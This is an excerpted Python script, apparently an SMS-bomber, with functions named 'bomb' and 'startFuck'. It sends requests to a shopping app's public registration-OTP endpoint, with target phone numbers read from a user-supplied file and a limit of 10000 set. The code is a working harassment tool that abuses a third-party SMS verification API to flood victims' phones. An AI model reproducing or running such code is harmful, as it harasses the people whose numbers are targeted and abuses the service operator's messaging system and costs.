...
def bomb(number):
    ...
    url=f"https://shopapp.self-shopping.com/public/smsapiupdate?mobile={number}&msg=registration_otp&reason=setotp&uniqueCode={requests.post("https://shopapp.self-shopping.com/public/otherspost?random=0.7632928168765943",json={"storeDeviceId":"0.otc4kup7889","uid":0},headers={"Host": "shopapp.self-shopping.com",
    "Accept-Encoding": "gzip, deflate, br",
...
def startFuck():
    ...
    file_name=input("Enter number file ( Exp : number.txt) : ")
    limit=10000
